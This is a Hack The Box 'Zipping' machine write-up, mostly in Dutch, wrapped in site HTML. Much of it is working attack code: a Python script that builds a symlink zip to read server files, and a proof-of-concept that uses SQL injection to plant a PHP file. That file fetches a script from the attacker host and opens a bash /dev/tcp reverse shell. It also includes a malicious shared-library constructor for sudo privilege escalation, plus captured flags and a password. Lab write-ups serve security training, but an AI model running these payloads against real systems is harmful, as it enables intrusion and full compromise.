@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap 10.129.229.87 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 19:04 CET Nmap scan report for 10.129.229.87 Host is up (0.029s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-zipping/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap 10.129.229.87 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 19:04 CET Nmap scan report for 10.129.229.87 Host is up (0.029s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.">
+  <meta itemprop="wordCount" content="1322">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap 10.129.229.87 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 19:04 CET Nmap scan report for 10.129.229.87 Host is up (0.029s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-zipping/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>nmap 10.129.229.87                                                                            
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 19:04 CET
+Nmap scan report for 10.129.229.87
+Host is up (0.029s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the gedatialized port scan go to get more information from the services dien are open the ip address.</p>
+<pre tabindex="0"><code>nmap -p22,80 -sCV 10.129.229.87 -vvvv
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 19:05 CET
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+Initiating Ping Scan at 19:05
+Scanning 10.129.229.87 [4 ports]
+Completed Ping Scan at 19:05, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 19:05
+Completed Parallel DNS resolution of 1 host. at 19:05, 0.05s elapsed
+DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 19:05
+Scanning 10.129.229.87 [2 ports]
+Discovered open port 22/tcp on 10.129.229.87
+Discovered open port 80/tcp on 10.129.229.87
+Completed SYN Stealth Scan at 19:05, 0.08s elapsed (2 total ports)
+Initiating Service scan at 19:05
+Scanning 2 services on 10.129.229.87
+Completed Service scan at 19:05, 6.09s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.229.87.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 1.94s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.16s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+Nmap scan report for 10.129.229.87
+Host is up, received echo-reply ttl 63 (0.030s latency).
+Scanned at 2025-02-20 19:05:05 CET for 8s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP6mSkoF2+wARZhzEmi4RDFkpQx3gdzfggbgeI5qtcIseo7h1mcxH8UCPmw8Gx9+JsOjcNPBpHtp2deNZBzgKcA=
+|   256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXXd7dM7wgVC+lrF0+ZIxKZlKdFhG2Caa9Uft/kLXDa
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.54 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.54 (Ubuntu)
+|_http-title: Zipping | Watch store
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds
+           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
+</code></pre><p>Ik ben naar de webpage geweest en daar heb ik gezien dat er zip files kunnen worden upgeload.. Ik ben dit gaan misbruiken voor het /etc/passwd file te zien vanop de server. Ik ben dit gaan doen door de volgende code te gebruiken die dat ik van uit de volgende bron heb gehaald. <a href="https://humble-raptor-f30.notion.site/Symlink-Sabotage-ZIPping-Through-Web-Security-a1e93524ee374a16934286df0e20765d">https://humble-raptor-f30.notion.site/Symlink-Sabotage-ZIPping-Through-Web-Security-a1e93524ee374a16934286df0e20765d</a></p>
+<p>UITLEGGEN WAT DE CODE GAAT DOEN.</p>
+<pre tabindex="0"><code>import requests
+import io
+import zipfile
+import stat
+
+def create_zip(target_file):
+    payload = io.BytesIO()
+    zipInfo = zipfile.ZipInfo(&#39;evil.pdf&#39;)
+    zipInfo.create_system=3
+    unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
+    zipInfo.external_attr = unix_st_mode &lt;&lt; 16
+    zipOut = zipfile.ZipFile(payload, &#39;w&#39;, compression=zipfile.ZIP_DEFLATED)
+    zipOut.writestr(zipInfo, target_file)
+    zipOut.close()
+    return payload.getvalue()
+
+with open(&#39;newfile.zip&#39;,&#39;wb&#39;) as f:
+        f.write(create_zip(&#39;/etc/passwd&#39;))
+</code></pre><p>Ik ben na de code het zip bestand gaan uploaden op de webpagina.</p>
+<p>![[Pasted image 20250320211357.png]]</p>
+<p>Ik ben vanuit de browser de url link gaan halen en heb ik op mijn machine het volgende commando uitgevoerd zodat ik kan gaan zien wat er nu in de pdf file staat.</p>
+<pre tabindex="0"><code>curl http://10.129.229.87/uploads/1788e6fc2fb7e6e6d92eed9c5e3771de/evil.pdf 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+rektsu:x:1001:1001::/home/rektsu:/bin/bash
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:999:999::/var/log/laurel:/bin/false
+</code></pre><p>Hier kunnen we zien dat de user rektsu heel waarschijnlijk de user zal zijn waar dat we user.txt file zullen moeten gaan zoeken. Ik ben dus nu gaan zoeken naar wat de webroot dir zal zijn. Dit ben ik gaan doen door naar de default apache file te gaan in de ssh server.</p>
+<pre tabindex="0"><code>/etc/apache2/sites-available/000-default.conf
+</code></pre><p>Ik ben deze path gaan aanpassen in het script weer hetzelfde gedaan als ervoor. Door het script uittevoeren en het te gaan bekijken heb ik gezien dat het documenroot path &ldquo;/var/www/html&rdquo; is.</p>
+<pre tabindex="0"><code>curl http://10.129.229.87/uploads/c52a4420c37bc6b039e2e714315e64d9/evil.pdf
+&lt;VirtualHost *:80&gt;
+        # The ServerName directive sets the request scheme, hostname and port that
+        # the server uses to identify itself. This is used when creating
+        # redirection URLs. In the context of virtual hosts, the ServerName
+        # specifies what hostname must appear in the request&#39;s Host: header to
+        # match this virtual host. For the default virtual host (this file) this
+        # value is not decisive as it is used as a last resort host regardless.
+        # However, you must set it for any further virtual host explicitly.
+        #ServerName www.example.com
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        &lt;Directory /var/www/html/uploads&gt;
+                Options -Indexes
+        &lt;/Directory&gt;
+
+        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+        # error, crit, alert, emerg.
+        # It is also possible to configure the loglevel for particular
+        # modules, e.g.
+        #LogLevel info ssl:warn
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+        # For most configuration files from conf-available/, which are
+        # enabled or disabled at a global level, it is possible to
+        # include a line for only one particular virtual host. For example the
+        # following line enables the CGI configuration for this host only
+        # after it has been globally disabled with &#34;a2disconf&#34;.
+        #Include conf-available/serve-cgi-bin.conf
+&lt;/VirtualHost&gt;
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+</code></pre><p>nu heb ik dit ook kunnen gebruiken voor de user.txt flag te pakken te krijgen.</p>
+<p>user flag = 92ec0d792236afacd5e49cd22dcc6392</p>
+<pre tabindex="0"><code>curl http://10.129.229.87/uploads/e790ebfc71988f138193198234c40932/evil.pdf
+92ec0d792236afacd5e49cd22dcc6392
+</code></pre><p>Nu moet ik wel nog de connectie met de ssh server maken. Dit zal ik gaan doen aan de hand van de volgende code:</p>
+<pre tabindex="0"><code>cat HTB_Zipping_poc.py      
+import requests
+import sys
+import subprocess
+import random
+
+if len(sys.argv) &lt; 2:
+    print(&#34;Usage: python3 HTB_Zipping_poc.py &lt;listener ip&gt; &lt;listener port&gt;&#34;)
+    sys.exit(1)
+
+fnb = random.randint(10, 10000)
+url = &#34;http://zipping.htb/&#34;
+
+session = requests.Session()
+
+print(&#34;[+] Please run nc in other terminal: rlwrap -cAr nc -nvlp &#34; + f&#34;{sys.argv[2]}&#34;)
+
+print(&#34;[+] Write php shell /var/lib/mysql/rvsl&#34; + str(fnb) + &#34;.php&#34;)
+
+with open(&#39;revshell.sh&#39;, &#39;w&#39;) as f:
+        f.write(&#34;#!/bin/bash\n&#34;)
+        f.write(f&#34;bash -i &gt;&amp; /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0&gt;&amp;1&#34;)
+proc = subprocess.Popen([&#34;python3&#34;, &#34;-m&#34;, &#34;http.server&#34;, &#34;8000&#34;])
+phpshell = session.get(url + f&#34;shop/index.php?page=product&amp;id=%0A&#39;%3bselect+&#39;&lt;%3fphp+system(\&#34;curl+http%3a//{sys.argv[1]}:8000/revshell.sh|bash\&#34;)%3b%3f&gt;&#39;+into+outfile+&#39;/var/lib/mysql/rvsl{fnb}.php&#39;+%231&#34;)
+
+print(&#34;[+] Get Reverse Shell&#34;)
+
+phpshell = session.get(url + f&#34;shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frvsl{fnb}&#34;)
+
+proc.terminate()
+</code></pre><p>Nu dat ik de rev shell heb, ben ik eerst het sudo -l commando gaan uitvoeren. Hierbij zal je kunnen zien dat we /usr/bin/stock kunnen gebruiken zonder het root password te moeten gebruiken.</p>
+<pre tabindex="0"><code>sudo -l
+sudo -l
+Matching Defaults entries for rektsu on zipping:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User rektsu may run the following commands on zipping:
+    (ALL) NOPASSWD: /usr/bin/stock
+</code></pre><p>Ik ben het commando &ldquo;sudo /usr/bin/stock&rdquo; gaan gebruiken maa, ik moest een password hebben voor in te kunnen loggen. Hiervoor ben ik het volgende commando gaan gebruiken waar dat ik het password in heb gevonden. Wat doet het commando nu juist,</p>
+<p>Password: St0ckM4nager</p>
+<pre tabindex="0"><code>rektsu@zipping:/var/www/html/shop$ strings /usr/bin/stock
+strings /usr/bin/stock                                                                                              
+/lib64/ld-linux-x86-64.so.2
+mgUa
+fgets
+stdin
+puts
+exit
+fopen
+__libc_start_main
+fprintf
+dlopen
+__isoc99_fscanf
+__cxa_finalize
+strchr
+fclose
+__isoc99_scanf
+strcmp
+__errno_location
+libc.so.6
+GLIBC_2.7
+GLIBC_2.2.5
+GLIBC_2.34
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+PTE1
+u+UH
+Hakaize
+St0ckM4nager
+/root/.stock.csv
+Enter the password:
+</code></pre><pre tabindex="0"><code>cat libcounter.c      
+#include &lt;stdlib.h&gt;
+__attribute__ ((__constructor__))
+void shell(void){
+    system(&#34;/bin/bash&#34;);
+}
+</code></pre><pre tabindex="0"><code>wget http://10.10.16.3:8001/libcounter.c
+</code></pre><pre tabindex="0"><code>gcc -shared -o libcounter.so -fPIC libcounter.c
+</code></pre><pre tabindex="0"><code>cat /root/root.txt
+cat /root/root.txt
+2680df25d3630508865bab737ed233e1
+</code></pre><p>![[Pasted image 20250322085635.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
